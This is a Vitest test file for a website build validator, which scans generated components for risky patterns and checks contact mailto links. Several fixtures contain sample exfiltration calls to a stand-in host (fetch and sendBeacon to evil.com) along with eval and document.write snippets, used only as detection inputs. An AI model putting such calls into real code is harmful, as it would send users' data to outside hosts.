import { RECOGNIZED_ORIGINS } from '../../shared/site-origin.js'
import { describe, it, expect, beforeEach } from 'vitest'
import { writeFileSync, mkdirSync, cpSync, existsSync } from 'node:fs'
import { resolve, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { tempDir } from '../helpers/tmp.js'
import {
  validateGenerated,
  contactLinkPresent,
  staleContactAddresses,
} from '../../scripts/utils/build-validator.js'

const __dirname = dirname(fileURLToPath(import.meta.url))
const REPO = resolve(__dirname, '../..')

// The scanner is exercised against a temp tree, not the repo.
//
// It used to drop fixtures into the real app/components/ and scan the whole
// working tree. Vitest runs files in parallel and file-manager.test.js writes
// into the same directory, and the scan swept up whatever the nightly had
// left behind — which is why six assertions below were written as
// `if (!result.success) expect(...).not.toContain(...)`. Those silently
// skipped on any checkout carrying an unrelated validator error, so the
// checks stopped being checks exactly when the tree was interesting.
let ROOT

beforeEach(async () => {
  ROOT = await tempDir('dm-scanner-')
  // The scanner reads elements/preset.ts for its circular-token check; copy
  // the real one so the temp tree is a fair stand-in.
  mkdirSync(resolve(ROOT, 'elements'), { recursive: true })
  mkdirSync(resolve(ROOT, 'app/components'), { recursive: true })
  mkdirSync(resolve(ROOT, 'app/routes'), { recursive: true })
  // Copy only what the validator requires to exist — the preset for its
  // circular-token check and app/content/about.ts, which Check 6 reads as the
  // source of truth for the contact address. Deliberately NOT the scanned
  // directories: app/components/ and app/routes/ stay empty except for the
  // fixture under test, which is what makes result.success meaningful.
  for (const rel of ['elements/preset.ts', 'app/content/about.ts', 'app/content/types.ts']) {
    const src = resolve(REPO, rel)
    if (existsSync(src)) {
      mkdirSync(dirname(resolve(ROOT, rel)), { recursive: true })
      cpSync(src, resolve(ROOT, rel))
    }
  }
  // Check 6 requires some file to link the contact address bound from
  // identity.email. Without it the baseline tree can never be clean, and
  // `expect(result.success).toBe(true)` would be unassertable — which is how
  // these ended up as `if (!result.success)` in the first place. A minimal
  // footer supplies it, so a failing result now means the fixture failed.
  writeFileSync(
    resolve(ROOT, 'app/components/__baseline_footer.tsx'),
    `import { identity } from '../content/about'\n` +
      `export const Footer = () => <a href={\`mailto:\${identity.email}\`}>hello@dougmar.ch</a>\n`,
    'utf8'
  )
})

function writeTestFile(relPath, content) {
  const abs = resolve(ROOT, relPath)
  mkdirSync(dirname(abs), { recursive: true })
  writeFileSync(abs, content, 'utf8')
}

describe('build validator content scanner', () => {
  // validateGenerated reads files on every call, so we just call it directly.
  const runValidator = () => validateGenerated({ root: ROOT })

  it('passes clean TSX code', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `export function Hello() { return <div>hello world</div> }`
    )
    const result = await runValidator()
    // Unconditional now that the tree is ours: nothing else can put an error
    // in this result, so "clean code passes" is an assertion again.
    expect(result.success).toBe(true)
  })

  it('flags fetch() calls', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `export function Bad() {
        fetch('https://evil.com/exfil')
        return <div />
      }`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('fetch() call')
  })

  it('flags eval()', async () => {
    writeTestFile('app/components/__scanner_test.tsx', `const x = eval('alert(1)')`)
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('eval()')
  })

  it('flags dangerouslySetInnerHTML', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `export function X() { return <div dangerouslySetInnerHTML={{ __html: 'x' }} /> }`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('dangerouslySetInnerHTML')
  })

  it('flags sendBeacon', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `navigator.sendBeacon('https://evil.com', data)`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('sendBeacon')
  })

  it('flags new Function()', async () => {
    writeTestFile('app/components/__scanner_test.tsx', `const f = new Function('return 1')`)
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('new Function()')
  })

  it('flags disallowed external URLs', async () => {
    writeTestFile('app/components/__scanner_test.tsx', `const url = 'https://evil.com/steal'`)
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('evil.com')
  })

  it('allows URLs to allowlisted hosts (fonts)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `const url = 'https://fonts.googleapis.com/css2?family=Inter'`
    )
    const result = await runValidator()
    expect(result.success).toBe(true)
  })

  it('allows URLs to github.com', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `const url = 'https://github.com/marchdoe/project'`
    )
    const result = await runValidator()
    expect(result.success).toBe(true)
  })

  it('allows URLs to all allowlisted project domains', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `const urls = [
        'https://spaceman.llc',
        'https://getfishsticks.com',
        'https://15th.club',
${RECOGNIZED_ORIGINS.map((o) => `        '${o}',`).join('\n')}
        'https://fonts.gstatic.com/s/inter',
      ]`
    )
    const result = await runValidator()
    expect(result.success).toBe(true)
  })

  it('flags document.write', async () => {
    writeTestFile('app/components/__scanner_test.tsx', `document.write('<p>bad</p>')`)
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('document.write')
  })

  it('ignores dangerous patterns inside comments', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `// Don't use fetch() here
       /* fetch() is bad */
       export function Safe() { return <div /> }`
    )
    const result = await runValidator()
    expect(result.success).toBe(true)
  })

  it('flags inline onclick HTML attribute but not JS property assignment', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `el.onclick = () => {} // this is JS, not HTML`
    )
    const result = await runValidator()
    // JS property assignment should NOT be flagged (different from HTML attribute)
    if (!result.success) {
      expect(result.error).not.toContain('__scanner_test.tsx: contains inline onclick')
    }
  })

  it('does not flag a URL that only appears in a trailing line comment (#313)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `export const A = 1 // see https://evil.example.com/docs
export function X() { return <div /> }`
    )
    const result = await runValidator()
    expect(result.success).toBe(true)
  })

  it('does not flag a URL that only appears inside a block comment (#313)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `/* see https://evil.example.com/docs for context */
       export function X() { return <div /> }`
    )
    const result = await runValidator()
    expect(result.success).toBe(true)
  })

  it('does not let comment-shaped string literals hide a real fetch() call (#313)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `const a = "/*"
       fetch('https://evil.com/exfil')
       const b = "*/"
       export function X() { return <div /> }`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('fetch() call')
    expect(result.error).toContain('evil.com')
  })

  it('still flags a URL inside a real string literal (#313)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `const url = 'https://evil.com/steal' // not the same as one in a comment`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('evil.com')
  })

  it('flags a URL in a bare `return` statement, with no punctuation before the quote (#313)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `function getUrl() {
         doSomething()
         return 'https://evil.example.com/a'
       }`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('evil.example.com')
  })

  it('flags a URL in a `case` label (#313)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `function route(x) {
         switch (x) {
           case 'a':
             break
           case 'https://evil.example.com/b':
             break
         }
       }`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('evil.example.com')
  })

  it('does not flag a URL that only appears as JSX text, not a string literal (#313)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `export function X() { return <p>Don't fetch https://evil.example.com</p> }`
    )
    const result = await runValidator()
    expect(result.success).toBe(true)
  })

  it('flags a URL passed to `throw new Error(...)` (#313)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `function f() {
         throw new Error('see https://evil.example.com')
       }`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('evil.example.com')
  })
})

describe('contact link detection (Check 6)', () => {
  const EMAIL = 'hello@dougmar.ch'

  it('accepts the address bound from identity.email', () => {
    // The form the react-engineer contract asks for. It never contains the
    // literal address, so a substring test alone would reject it.
    const src = `<a href={\`mailto:\${identity.email}\`}>{identity.email}</a>`
    expect(contactLinkPresent([src], EMAIL)).toBe(true)
  })

  it('accepts a hardcoded but correct address', () => {
    expect(contactLinkPresent(['<a href="mailto:hello@dougmar.ch">mail</a>'], EMAIL)).toBe(true)
  })

  it('rejects the page anchor that replaced the mailto on 2026-08-29', () => {
    // The real regression: Sidebar.tsx's { href: 'mailto:...', label: 'Contact' }
    // became { label: '03 CONTACT', href: '/#contact' } overnight.
    const src = "const items = [{ label: '03 CONTACT', href: '/#contact' }]"
    expect(contactLinkPresent([src], EMAIL)).toBe(false)
  })

  it('rejects a stale address left behind after the canonical one moves', () => {
    expect(contactLinkPresent(['<a href="mailto:hello@doug-march.com">x</a>'], EMAIL)).toBe(false)
  })

  it('rejects an interpolation that binds something other than identity.email', () => {
    const src = `<a href={\`mailto:\${project.contact}\`}>x</a>`
    expect(contactLinkPresent([src], EMAIL)).toBe(false)
  })

  it('is satisfied by any one file in the set, not every file', () => {
    // Footer may carry it while Sidebar does not. The question is site-wide.
    const sidebar = "{ label: 'CONTACT', href: '/#contact' }"
    const footer = `<a href={\`mailto:\${identity.email}\`}>mail</a>`
    expect(contactLinkPresent([sidebar, footer], EMAIL)).toBe(true)
  })

  it('finds no link in an empty set', () => {
    expect(contactLinkPresent([], EMAIL)).toBe(false)
  })
})

describe('stale contact addresses at our own domains (Check 6)', () => {
  const EMAIL = 'hello@dougmar.ch'
  const HOSTS = ['doug-march.com', 'dougmar.ch']

  it('catches the exact case that shipped: a right link and a wrong one', () => {
    // Footer bound identity.email while Sidebar still hardcoded the old host,
    // so contactLinkPresent passed and the live site advertised both — one of
    // which has no MX records and silently discards mail.
    const footer = `<a href={\`mailto:\${identity.email}\`}>mail</a>`
    const sidebar = "{ href: 'mailto:hello@doug-march.com', label: 'Contact' }"
    expect(contactLinkPresent([footer, sidebar], EMAIL)).toBe(true)
    expect(staleContactAddresses([footer, sidebar], EMAIL, HOSTS)).toEqual(['hello@doug-march.com'])
  })

  it('accepts the canonical address', () => {
    expect(staleContactAddresses(['mailto:hello@dougmar.ch'], EMAIL, HOSTS)).toEqual([])
  })

  it('ignores an interpolation, which only resolves at runtime', () => {
    const src = `<a href={\`mailto:\${identity.email}\`}>x</a>`
    expect(staleContactAddresses([src], EMAIL, HOSTS)).toEqual([])
  })

  it("leaves other people's domains alone", () => {
    // A mailto to someone else is not this check's business.
    const src = 'mailto:someone@example.com'
    expect(staleContactAddresses([src], EMAIL, HOSTS)).toEqual([])
  })

  it('catches an old-host address even at a different mailbox', () => {
    expect(staleContactAddresses(['mailto:doug@doug-march.com'], EMAIL, HOSTS)).toEqual([
      'doug@doug-march.com',
    ])
  })

  it('dedupes the same stale address across files', () => {
    const a = 'mailto:hello@doug-march.com'
    const b = 'href="mailto:hello@doug-march.com"'
    expect(staleContactAddresses([a, b], EMAIL, HOSTS)).toEqual(['hello@doug-march.com'])
  })
})
